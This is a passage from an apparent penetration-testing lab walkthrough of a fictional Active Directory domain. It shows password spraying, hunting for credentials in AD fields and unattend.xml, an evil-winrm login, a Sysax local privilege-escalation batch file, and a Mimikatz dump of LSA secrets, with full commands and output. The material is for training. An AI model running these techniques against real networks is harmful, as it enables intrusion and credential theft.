<p>One hash cracks, but checking in BloodHound, the account does not seem to be helpful to us. We can still note down another finding for <code>Weak Kerberos Authentication Configuration (Kerberoasting)</code> and move on.</p>
<hr>
<h3 id="password-spraying">Password Spraying</h3>
<p>Another lateral movement technique worth exploring is Password Spraying. We can use <a href="https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/master/DomainPasswordSpray.ps1">DomainPasswordSpray.ps1</a> or the Windows version of Kerbrute from the DEV01 host or use Kerbrute from our attack host via Proxychains (all worth playing around with).</p>
<p>Share Hunting</p>
<pre><code class="lang-powershell-session">PS C:\DotNetNuke\Portals\<span class="hljs-number">0</span>&gt; Invoke-DomainPasswordSpray -Password Welcome1

[*] Current domain <span class="hljs-keyword">is</span> compatible <span class="hljs-keyword">with</span> Fine-Grained Password Policy.
[*] The domain password policy observation window <span class="hljs-keyword">is</span> <span class="hljs-keyword">set</span> <span class="hljs-keyword">to</span>  minutes.
[*] Setting a  minute wait <span class="hljs-keyword">in</span> <span class="hljs-keyword">between</span> sprays.

Confirm Password Spray
Are you sure you want <span class="hljs-keyword">to</span> perform a password spray <span class="hljs-keyword">against</span> <span class="hljs-number">2913</span> accounts?
[Y] Yes  [N] No  [?] Help (default <span class="hljs-keyword">is</span> <span class="hljs-string">"Y"</span>): y
[*] Password spraying has begun <span class="hljs-keyword">with</span>  <span class="hljs-number">1</span>  passwords
[*] This might take a <span class="hljs-keyword">while</span> depending <span class="hljs-keyword">on</span> <span class="hljs-keyword">the</span> total <span class="hljs-built_in">number</span> <span class="hljs-keyword">of</span> users
[*] Now trying password Welcome1 <span class="hljs-keyword">against</span> <span class="hljs-number">2913</span> users. Current <span class="hljs-built_in">time</span> <span class="hljs-keyword">is</span> <span class="hljs-number">11</span>:<span class="hljs-number">47</span> AM
[*] SUCCESS! User:kdenunez Password:Welcome1
[*] SUCCESS! User:mmertle Password:Welcome1
[*] Password spraying <span class="hljs-keyword">is</span> complete
</code></pre>
<p>We find a valid password for two more users, but neither has interesting access. It&#39;s still worth noting down a finding for <code>Weak Active Directory Passwords</code> allowed and moving on.</p>
<hr>
<h3 id="misc-techniques">Misc Techniques</h3>
<p>Let&#39;s try a few more things to cover all our bases. We can search the SYSVOL share for <code>Registry.xml</code> files that may contain passwords for users configured with autologon via Group Policy.</p>
<p>Share Hunting</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ proxychains crackmapexec smb <span class="hljs-number">172.16</span><span class="hljs-number">.8</span><span class="hljs-number">.3</span> -u ssmalls -p Str0ngpass86! -M gpp_autologin

ProxyChains<span class="hljs-number">-3.1</span> (http:<span class="hljs-comment">//proxychains.sf.net)</span>
|S-chain|-&lt;&gt;<span class="hljs-number">-127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">8083</span>-&lt;&gt;&lt;&gt;<span class="hljs-number">-172.16</span><span class="hljs-number">.8</span><span class="hljs-number">.3</span>:<span class="hljs-number">445</span>-&lt;&gt;&lt;&gt;-OK
|S-chain|-&lt;&gt;<span class="hljs-number">-127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">8083</span>-&lt;&gt;&lt;&gt;<span class="hljs-number">-172.16</span><span class="hljs-number">.8</span><span class="hljs-number">.3</span>:<span class="hljs-number">445</span>-&lt;&gt;&lt;&gt;-OK
|S-chain|-&lt;&gt;<span class="hljs-number">-127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">8083</span>-&lt;&gt;&lt;&gt;<span class="hljs-number">-172.16</span><span class="hljs-number">.8</span><span class="hljs-number">.3</span>:<span class="hljs-number">135</span>-&lt;&gt;&lt;&gt;-OK
|S-chain|-&lt;&gt;<span class="hljs-number">-127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">8083</span>-&lt;&gt;&lt;&gt;<span class="hljs-number">-172.16</span><span class="hljs-number">.8</span><span class="hljs-number">.3</span>:<span class="hljs-number">445</span>-&lt;&gt;&lt;&gt;-OK
|S-chain|-&lt;&gt;<span class="hljs-number">-127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">8083</span>-&lt;&gt;&lt;&gt;<span class="hljs-number">-172.16</span><span class="hljs-number">.8</span><span class="hljs-number">.3</span>:<span class="hljs-number">445</span>-&lt;&gt;&lt;&gt;-OK
SMB         <span class="hljs-number">172.16</span><span class="hljs-number">.8</span><span class="hljs-number">.3</span>      <span class="hljs-number">445</span>    DC01             [*] Windows <span class="hljs-number">10.0</span> Build <span class="hljs-number">17763</span> x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:<span class="hljs-literal">True</span>) (SMBv1:<span class="hljs-literal">False</span>)
|S-chain|-&lt;&gt;<span class="hljs-number">-127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">8083</span>-&lt;&gt;&lt;&gt;<span class="hljs-number">-172.16</span><span class="hljs-number">.8</span><span class="hljs-number">.3</span>:<span class="hljs-number">445</span>-&lt;&gt;&lt;&gt;-OK
SMB         <span class="hljs-number">172.16</span><span class="hljs-number">.8</span><span class="hljs-number">.3</span>      <span class="hljs-number">445</span>    DC01             [+] INLANEFREIGHT.LOCAL\ssmalls:Str0ngpass86! 
GPP_AUTO... <span class="hljs-number">172.16</span><span class="hljs-number">.8</span><span class="hljs-number">.3</span>      <span class="hljs-number">445</span>    DC01             [+] Found SYSVOL share
GPP_AUTO... <span class="hljs-number">172.16</span><span class="hljs-number">.8</span><span class="hljs-number">.3</span>      <span class="hljs-number">445</span>    DC01             [*] Searching for Registry.xml
</code></pre>
<p>This doesn&#39;t turn up anything useful. Moving on, we can search for passwords in user <code>Description</code> fields in AD, which is not overly common, but we still see it from time to time (I have even seen Domain and Enterprise Admin account passwords here!).</p>
<p>Share Hunting</p>
<pre><code class="lang-powershell-session">PS C:\DotNetNuke\Portals\<span class="hljs-number">0</span>&gt; Get-DomainUser * |<span class="hljs-keyword">select</span> samaccountname,description | ?{$_.Description -ne $null}

samaccountname description
-------------- -----------
Administrator  Built-<span class="hljs-keyword">in</span> account <span class="hljs-keyword">for</span> administering the computer/domain
frontdesk      ILFreightLobby!
Guest          Built-<span class="hljs-keyword">in</span> account <span class="hljs-keyword">for</span> guest access <span class="hljs-keyword">to</span> the computer/d...
krbtgt         Key Distribution Center Service Account
</code></pre>
<p>We find one for the account <code>frontdesk,</code> but this one isn&#39;t useful either. It&#39;s worth noting that there are many multiple ways to obtain a user account password in this domain, and there is the one host with RDP privileges granted to all Domain Users. Though these accounts do not have any special rights, it would be a client fixing these issues because an attacker often only needs one password to be successful in AD. Here we can note down a finding for <code>Passwords in AD User Description Field</code> and continue onwards.</p>
<hr>
<h3 id="next-steps">Next Steps</h3>
<p>At this point, we have dug into the domain pretty heavily and have found several sets of credentials but hit a bit of a brick wall. Going back to the basics, we can run a scan to see if any hosts have WinRM enabled and attempt to connect with each set of credentials.</p>
<p>Share Hunting</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ proxychains nmap -<span class="hljs-built_in">sT</span> -p <span class="hljs-number">5985</span> <span class="hljs-number">172.16</span><span class="hljs-meta">.8</span><span class="hljs-meta">.50</span>

ProxyChains-<span class="hljs-number">3.1</span> (http://proxychains.sf.net)
Starting Nmap <span class="hljs-number">7.92</span> ( https://nmap.org ) <span class="hljs-meta">at</span> <span class="hljs-number">2022</span>-<span class="hljs-number">06</span>-<span class="hljs-number">22</span> <span class="hljs-number">14</span>:<span class="hljs-number">59</span> EDT
|S-chain|-&lt;&gt;-<span class="hljs-number">127.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.1</span>:<span class="hljs-number">8083</span>-&lt;&gt;&lt;&gt;-<span class="hljs-number">172.16</span><span class="hljs-meta">.8</span><span class="hljs-meta">.50</span>:<span class="hljs-number">80</span>-&lt;--timeout
|S-chain|-&lt;&gt;-<span class="hljs-number">127.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.1</span>:<span class="hljs-number">8083</span>-&lt;&gt;&lt;&gt;-<span class="hljs-number">172.16</span><span class="hljs-meta">.8</span><span class="hljs-meta">.50</span>:<span class="hljs-number">5985</span>-&lt;&gt;&lt;&gt;-OK
Nmap scan report for <span class="hljs-number">172.16</span><span class="hljs-meta">.8</span><span class="hljs-meta">.50</span>
Host is <span class="hljs-meta">up</span> (<span class="hljs-number">0.</span>12s latency).

PORT     STATE SERVICE
<span class="hljs-number">5985</span>/tcp open  wsman

Nmap done: <span class="hljs-number">1</span> <span class="hljs-built_in">IP</span> address (<span class="hljs-number">1</span> host <span class="hljs-meta">up</span>) scanned <span class="hljs-keyword">in</span> <span class="hljs-number">0.32</span> seconds
</code></pre>
<p>The host <code>172.16.8.50</code>, or <code>MS01</code> is the only one left that we haven&#39;t gotten into aside from the Domain Controller, so let&#39;s give it a try using <code>evil-winrm</code> and the credentials for the <code>backupadm</code> user.</p>
<p>It works, and we&#39;re in!</p>
<p>Share Hunting</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ proxychains evil-winrm -i <span class="hljs-number">172.16</span>.<span class="hljs-number">8.50</span> -<span class="hljs-keyword">u</span> backupadm 

ProxyChains-<span class="hljs-number">3.1</span> (http://proxychains.<span class="hljs-keyword">sf</span>.net)
Enter Password: 

Evil-WinRM <span class="hljs-keyword">shell</span> v3.<span class="hljs-number">4</span>

Warnin<span class="hljs-variable">g:</span> Remote path completions <span class="hljs-keyword">is</span> disabled due <span class="hljs-keyword">to</span> <span class="hljs-keyword">ruby</span> limitation: quoting_detection_proc() <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is</span> <span class="hljs-title">unimplemented</span> <span class="hljs-title">on</span> <span class="hljs-title">this</span> <span class="hljs-title">machine</span></span>

Dat<span class="hljs-variable">a:</span> For more information, check Evil-WinRM Githu<span class="hljs-variable">b:</span> http<span class="hljs-variable">s:</span>//github.<span class="hljs-keyword">com</span>/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection <span class="hljs-keyword">to</span> remote endpoint

|S-chain|-&lt;&gt;-<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8083</span>-&lt;&gt;&lt;&gt;-<span class="hljs-number">172.16</span>.<span class="hljs-number">8.50</span>:<span class="hljs-number">5985</span>-&lt;&gt;&lt;&gt;-OK
*Evil-WinRM* PS C:\Users\backupadm\Documents&gt; <span class="hljs-built_in">hostname</span>
ACADEMY-AEN-MS01
</code></pre>
<p>At this point, we could use this evil-winrm shell to further enumerate the domain with a tool such as PowerView. Keep in mind that we&#39;ll need to use a PSCredential object to perform enumeration from this shell due to the <a href="https://academy.hackthebox.com/module/143/section/1573">Kerberos &quot;Double Hop&quot; problem</a>. Practice this technique and see what other AD enumeration tools you may be able to use in this way.</p>
<p>Back to the task at hand. Our user is not a local admin, and <code>whoami /priv</code> does not turn up any useful privileges. Looking through the <code>Windows Privilege Escalation</code> module, we don&#39;t find much interesting so let&#39;s hunt for credentials. After some digging around, we find an <code>unattend.xml</code> file leftover from a previous installation.</p>
<p>Share Hunting</p>
<pre><code class="lang-shell-session">*Evil-W<span class="hljs-keyword">in</span>RM* PS C:\Users\backupadm\desktop&gt; cd c:\panther

|S-chain|-<span class="hljs-variable">&lt;&gt;</span>-<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8083</span>-<span class="hljs-variable">&lt;&gt;</span><span class="hljs-variable">&lt;&gt;</span>-<span class="hljs-number">172.16</span>.<span class="hljs-number">8.50</span>:<span class="hljs-number">5985</span>-<span class="hljs-variable">&lt;&gt;</span><span class="hljs-variable">&lt;&gt;</span>-OK
|S-chain|-<span class="hljs-variable">&lt;&gt;</span>-<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8083</span>-<span class="hljs-variable">&lt;&gt;</span><span class="hljs-variable">&lt;&gt;</span>-<span class="hljs-number">172.16</span>.<span class="hljs-number">8.50</span>:<span class="hljs-number">5985</span>-<span class="hljs-variable">&lt;&gt;</span><span class="hljs-variable">&lt;&gt;</span>-OK
*Evil-W<span class="hljs-keyword">in</span>RM* PS C:\panther&gt; dir


    Directory: C:\panther


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         <span class="hljs-number">6</span>/<span class="hljs-number">1</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">2</span>:<span class="hljs-number">17</span> PM           <span class="hljs-number">6995</span> unattend.xml
</code></pre>
<p>Let&#39;s check to see if it contains any passwords, as they sometimes do.</p>
<p>Share Hunting</p>
<pre><code class="lang-shell-session">
*Evil-WinRM* PS C:\panther&gt; type unattend.xml

|S-chain|-<span class="hljs-tag">&lt;&gt;</span>-127.0.0.1:8083-<span class="hljs-tag">&lt;&gt;</span><span class="hljs-tag">&lt;&gt;</span>-172.16.8.50:5985-<span class="hljs-tag">&lt;&gt;</span><span class="hljs-tag">&lt;&gt;</span>-OK
|S-chain|-<span class="hljs-tag">&lt;&gt;</span>-127.0.0.1:8083-<span class="hljs-tag">&lt;&gt;</span><span class="hljs-tag">&lt;&gt;</span>-172.16.8.50:5985-<span class="hljs-tag">&lt;&gt;</span><span class="hljs-tag">&lt;&gt;</span>-OK
<span class="php"><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"utf-8"</span><span class="hljs-meta">?&gt;</span></span>
<span class="hljs-tag">&lt;<span class="hljs-name">unattend</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">"urn:schemas-microsoft-com:unattend"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">settings</span> <span class="hljs-attr">pass</span>=<span class="hljs-string">"oobeSystem"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">component</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"Microsoft-Windows-International-Core"</span> <span class="hljs-attr">processorArchitecture</span>=<span class="hljs-string">"amd64"</span> <span class="hljs-attr">publicKeyToken</span>=<span class="hljs-string">"31bf3856ad364e35"</span> <span class="hljs-attr">language</span>=<span class="hljs-string">"neutral"</span> <span class="hljs-attr">versionScope</span>=<span class="hljs-string">"nonSxS"</span> <span class="hljs-attr">xmlns:wcm</span>=<span class="hljs-string">"http://schemas.microsoft.com/WMIConfig/2002/State"</span> <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">"http://www.w3.org/2001/XMLSchema-instance"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">InputLocale</span>&gt;</span>de-de<span class="hljs-tag">&lt;/<span class="hljs-name">InputLocale</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">SystemLocale</span>&gt;</span>de-de<span class="hljs-tag">&lt;/<span class="hljs-name">SystemLocale</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">UILanguage</span>&gt;</span>de-de<span class="hljs-tag">&lt;/<span class="hljs-name">UILanguage</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">UILanguageFallback</span>&gt;</span>de-de<span class="hljs-tag">&lt;/<span class="hljs-name">UILanguageFallback</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">UserLocale</span>&gt;</span>de-de<span class="hljs-tag">&lt;/<span class="hljs-name">UserLocale</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">component</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">component</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"Microsoft-Windows-Shell-Setup"</span> <span class="hljs-attr">processorArchitecture</span>=<span class="hljs-string">"amd64"</span> <span class="hljs-attr">publicKeyToken</span>=<span class="hljs-string">"31bf3856ad364e35"</span> <span class="hljs-attr">language</span>=<span class="hljs-string">"neutral"</span> <span class="hljs-attr">versionScope</span>=<span class="hljs-string">"nonSxS"</span> <span class="hljs-attr">xmlns:wcm</span>=<span class="hljs-string">"http://schemas.microsoft.com/WMIConfig/2002/State"</span> <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">"http://www.w3.org/2001/XMLSchema-instance"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">OOBE</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">HideEULAPage</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">HideEULAPage</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">HideWirelessSetupInOOBE</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">HideWirelessSetupInOOBE</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">NetworkLocation</span>&gt;</span>Work<span class="hljs-tag">&lt;/<span class="hljs-name">NetworkLocation</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">ProtectYourPC</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">ProtectYourPC</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">OOBE</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">AutoLogon</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">Password</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">Value</span>&gt;</span>Sys26Admin<span class="hljs-tag">&lt;/<span class="hljs-name">Value</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">PlainText</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">PlainText</span>&gt;</span>
                <span class="hljs-tag">&lt;/<span class="hljs-name">Password</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">Enabled</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">Enabled</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">LogonCount</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">LogonCount</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">Username</span>&gt;</span>ilfserveradm<span class="hljs-tag">&lt;/<span class="hljs-name">Username</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">AutoLogon</span>&gt;</span>

        <span class="hljs-tag">&lt;<span class="hljs-name">SNIP</span>&gt;</span>

        <span class="hljs-tag">&lt;/<span class="hljs-name">component</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">settings</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">unattend</span>&gt;</span>
</code></pre>
<p>We find credentials for the local user <code>ilfserveradm</code>, with the password <code>Sys26Admin</code>.</p>
<p>Share Hunting</p>
<pre><code class="lang-shell-session">*Evil-WinRM* PS C:\panther&gt; net <span class="hljs-keyword">user</span> <span class="hljs-title">ilfserveradm</span>

<span class="hljs-keyword">User</span> <span class="hljs-title">name</span>                    ilfserveradm
Full Name                    ilfserveradm
Comment
User's comment
Country/region code          <span class="hljs-number">000</span> (System Default)
Account active               Yes
Account expires              Never

Password last set            <span class="hljs-number">6</span>/<span class="hljs-number">1</span>/<span class="hljs-number">2022</span> <span class="hljs-number">2</span>:<span class="hljs-number">17</span>:<span class="hljs-number">17</span> PM
Password expires             Never
Password changeable          <span class="hljs-number">6</span>/<span class="hljs-number">1</span>/<span class="hljs-number">2022</span> <span class="hljs-number">2</span>:<span class="hljs-number">17</span>:<span class="hljs-number">17</span> PM
Password required            Yes
<span class="hljs-keyword">User</span> <span class="hljs-title">may</span> change password     Yes

Workstations allowed         All
Logon script
<span class="hljs-keyword">User</span> <span class="hljs-title">profile</span>
Home directory
Last logon                   <span class="hljs-number">6</span>/<span class="hljs-number">1</span>/<span class="hljs-number">2022</span> <span class="hljs-number">2</span>:<span class="hljs-number">17</span>:<span class="hljs-number">17</span> PM

Logon hours allowed          All

Local <span class="hljs-keyword">Group</span> <span class="hljs-title">Memberships</span>      *Remote Desktop Users
Global <span class="hljs-keyword">Group</span> <span class="hljs-title">memberships</span>     *None
The command completed successfully.
</code></pre>
<p>This isn&#39;t a domain user, but it&#39;s interesting that this user has Remote Desktop access but is not a member of the local admins group. Let&#39;s RDP in and see what we can do. After RDPing in and performing additional enumeration, we find some non-standard software installed in the <code>C:\Program Files (x86)\SysaxAutomation</code> directory. A quick search yields <a href="https://www.exploit-db.com/exploits/50834">this</a> local privilege escalation exploit. According to the write-up, this Sysax Scheduled Service runs as the local SYSTEM account and allows users to create and run backup jobs. If the option to run as a user is removed, it will default to running the task as the SYSTEM account. Let&#39;s test it out!</p>
<p>First, create a file called <code>pwn.bat</code> in <code>C:\Users\ilfserveradm\Documents</code> containing the line <code>net localgroup administrators ilfserveradm /add</code> to add our user to the local admins group (sometime we&#39;d need to clean up and note down in our report appendices). Next, we can perform the following steps:</p>
<ul>
<li>Open <code>C:\Program Files (x86)\SysaxAutomation\sysaxschedscp.exe</code></li>
<li>Select <code>Setup Scheduled/Triggered Tasks</code></li>
<li>Add task (Triggered)</li>
<li>Update folder to monitor to be <code>C:\Users\ilfserveradm\Documents</code></li>
<li>Check <code>Run task if a file is added to the monitor folder or subfolder(s)</code></li>
<li>Choose <code>Run any other Program</code> and choose <code>C:\Users\ilfserveradm\Documents\pwn.bat</code></li>
<li>Uncheck <code>Login as the following user to run task</code></li>
<li>Click <code>Finish</code> and then <code>Save</code></li>
</ul>
<p>Finally, to trigger the task, create a new .txt file in the <code>C:\Users\ilfserveradm\Documents</code> directory. We can check and see that the <code>ilfserveradm</code> user was added to the <code>Administrators</code> group.</p>
<p>Share Hunting</p>
<pre><code class="lang-cmd-session">C:\Users\ilfserveradm&gt; net localgroup administrators

Alias name     administrators
Comment        Administrators have complete <span class="hljs-keyword">and</span> unrestricted access <span class="hljs-built_in">to</span> <span class="hljs-keyword">the</span> computer/domain

Members

<span class="hljs-comment">-------------------------------------------------------------------------------</span>
Administrator
ilfserveradm
INLANEFREIGHT\Domain Admins
The <span class="hljs-keyword">command</span> <span class="hljs-title">completed</span> <span class="hljs-title">successfully</span>.
</code></pre>
<hr>
<h3 id="post-exploitation-pillaging">Post-Exploitation/Pillaging</h3>
<p>Next, we&#39;ll perform some post-exploitation on the MS01 host. We do see a couple of interesting files in the root of the c:\ drive named <code>budget_data.xlsx</code> and <code>Inlanefreight.kdbx</code> that would be worth looking into and potentially reporting to the client if they are not in their intended location. Next, we can use Mimikatz, elevate to an <code>NT AUTHORITY\SYSTEM</code> token and dump LSA secrets.</p>
<p>Share Hunting</p>
<pre><code class="lang-cmd-session">c:\Users\ilfserveradm\Documents&gt; mimikatz.exe

  .<span class="hljs-comment">#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29</span>
 .<span class="hljs-comment">## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)</span>
 <span class="hljs-comment">## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span>
 <span class="hljs-comment">## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz</span>
 '<span class="hljs-comment">## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )</span>
  '<span class="hljs-comment">#####'        &gt; https://pingcastle.com / https://mysmartlogon.com ***/</span>

mimikatz <span class="hljs-comment"># log</span>
Using 'mimikatz.log' for logfile : OK

mimikatz <span class="hljs-comment"># privilege::debug</span>
Privilege '20' OK

mimikatz <span class="hljs-comment"># lsadump::secrets</span>
Domain : ACADEMY-AEN-MS0
SysKey : 61b3d49a6205a1dedb14591c22d36afc
ERROR kuhl_m_lsadump_secretsOrCache ; kull_m_registry_RegOpenKeyEx (SECURITY) (0x00000005)

mimikatz <span class="hljs-comment"># token::elevate</span>
Token Id  : 0
User name :
SID name  : NT AUTHORITY\SYSTEM

564     {0;000003e7}<span class="hljs-number"> 1 </span>D<span class="hljs-number"> 30073 </span>         NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
 -&gt; Impersonated !
 * Process Token : {0;0136075a}<span class="hljs-number"> 2 </span>F<span class="hljs-number"> 20322234 </span>   ACADEMY-AEN-MS0\ilfserveradm    S-1-5-21-1020326033-369054202-3290056218-1002   (14g,24p)       Primary
 * Thread Token  : {0;000003e7}<span class="hljs-number"> 1 </span>D<span class="hljs-number"> 20387820 </span>   NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)

mimikatz <span class="hljs-comment"># lsadump::secrets</span>
Domain : ACADEMY-AEN-MS0
SysKey : 61b3d49a6205a1dedb14591c22d36afc

Local name : ACADEMY-AEN-MS0 ( S-1-5-21-1020326033-369054202-3290056218 )
Domain name : INLANEFREIGHT ( S-1-5-21-2814148634-3729814499-1637837074 )
Domain FQDN : INLANEFREIGHT.LOCAL

Policy subsystem is : 1.18
LSA Key(s) : 1, default {13764b01-b89c-8adf-69ec-8937ee43821e}
  [00] {13764b01-b89c-8adf-69ec-8937ee43821e} 587be7dcfb75bb9ebb0c5c75cf4afb4488e602f9926f3404a09ecf8ba20b04e7

Secret  : $MACHINE.ACC
cur/text: -2d"GC)[+6,[+mC+UC5KXVoH&gt;j`S8CAlq1nQCP6:[*-Zv@_NAs`Pm$9xv7ohquyAKz1:rX[E40v)=p8-5@%eK3(&lt;7tZW"I\7`,Bu<span class="hljs-comment">#]N$'%A`$Z?E@9V2zdh=</span>
    NTLM:ced50a6f3cb256110200dcb022b32c12
    SHA1:0b5cb5af0f13110312456892b7ebede53db440e8
old/text: -2d"GC)[+6,[+mC+UC5KXVoH&gt;j`S8CAlq1nQCP6:[*-Zv@_NAs`Pm$9xv7ohquyAKz1:rX[E40v)=p8-5@%eK3(&lt;7tZW"I\7`,Bu<span class="hljs-comment">#]N$'%A`$Z?E@9V2zdh=</span>
    NTLM:ced50a6f3cb256110200dcb022b32c12
    SHA1:0b5cb5af0f13110312456892b7ebede53db440e8

Secret  : DefaultPassword
cur/text: DBAilfreight1!

Secret  : DPAPI_SYSTEM
cur/hex :<span class="hljs-number"> 01 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 37 </span>62<span class="hljs-number"> 35 </span>26<span class="hljs-number"> 80 </span>4c 6b 2f<span class="hljs-number"> 11 </span>ca<span class="hljs-number"> 06 </span>25 ab<span class="hljs-number"> 97 </span>21 3f<span class="hljs-number"> 84 </span>f8<span class="hljs-number"> 74 </span>fa bc<span class="hljs-number"> 69 </span>a1 c4<span class="hljs-number"> 37 </span>2b df f8 cd 6c 8f 0a 8a d9<span class="hljs-number"> 67 </span>e9<span class="hljs-number"> 42 </span>cf 4f 96
    full: 37623526804c6b2f11ca0625ab97213f84f874fabc69a1c4372bdff8cd6c8f0a8ad967e942cf4f96
    m/u : 37623526804c6b2f11ca0625ab97213f84f874fa / bc69a1c4372bdff8cd6c8f0a8ad967e942cf4f96
old/hex :<span class="hljs-number"> 01 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 51 </span>9c<span class="hljs-number"> 86 </span>b4 cb dc<span class="hljs-number"> 97 </span>8b<span class="hljs-number"> 35 </span>9b c0<span class="hljs-number"> 39 </span>17<span class="hljs-number"> 34 </span>16<span class="hljs-number"> 62 </span>31<span class="hljs-number"> 98 </span>c1<span class="hljs-number"> 07 </span>ce 7d 9f<span class="hljs-number"> 94 </span>fc e7 2c d9<span class="hljs-number"> 59 </span>8a c6<span class="hljs-number"> 07 </span>10<span class="hljs-number"> 78 </span>7c 0d 9a<span class="hljs-number"> 56 </span>ce 0b
    full: 519c86b4cbdc978b359bc039173416623198c107ce7d9f94fce72cd9598ac60710787c0d9a56ce0b
    m/u : 519c86b4cbdc978b359bc039173416623198c107 / ce7d9f94fce72cd9598ac60710787c0d9a56ce0b

Secret  : NL$KM
cur/hex : a2<span class="hljs-number"> 52 </span>9d<span class="hljs-number"> 31 </span>0b b7 1c<span class="hljs-number"> 75 </span>45 d6 4b<span class="hljs-number"> 76 </span>41 2d d3<span class="hljs-number"> 21 </span>c6 5c dd<span class="hljs-number"> 04 </span>24 d3<span class="hljs-number"> 07 </span>ff ca 5c f4 e5 a0<span class="hljs-number"> 38 </span>94<span class="hljs-number"> 14 </span>91<span class="hljs-number"> 64 </span>fa c7<span class="hljs-number"> 91 </span>d2 0e<span class="hljs-number"> 02 </span>7a d6<span class="hljs-number"> 52 </span>53 b4 f4 a9 6f<span class="hljs-number"> 58 </span>ca<span class="hljs-number"> 76 </span>00 dd<span class="hljs-number"> 39 </span>01 7d c5 f7 8f 4b ab 1e dc 63
old/hex : a2<span class="hljs-number"> 52 </span>9d<span class="hljs-number"> 31 </span>0b b7 1c<span class="hljs-number"> 75 </span>45 d6 4b<span class="hljs-number"> 76 </span>41 2d d3<span class="hljs-number"> 21 </span>c6 5c dd<span class="hljs-number"> 04 </span>24 d3<span class="hljs-number"> 07 </span>ff ca 5c f4 e5 a0<span class="hljs-number"> 38 </span>94<span class="hljs-number"> 14 </span>91<span class="hljs-number"> 64 </span>fa c7<span class="hljs-number"> 91 </span>d2 0e<span class="hljs-number"> 02 </span>7a d6<span class="hljs-number"> 52 </span>53 b4 f4 a9 6f<span class="hljs-number"> 58 </span>ca<span class="hljs-number"> 76 </span>00 dd<span class="hljs-number"> 39 </span>01 7d c5 f7 8f 4b ab 1e dc 63
</code></pre>
<p>We find a set password but no associated username. This appears to be for an account configured with autologon, so we can query the Registry to find the username.</p>
<p>Share Hunting</p>
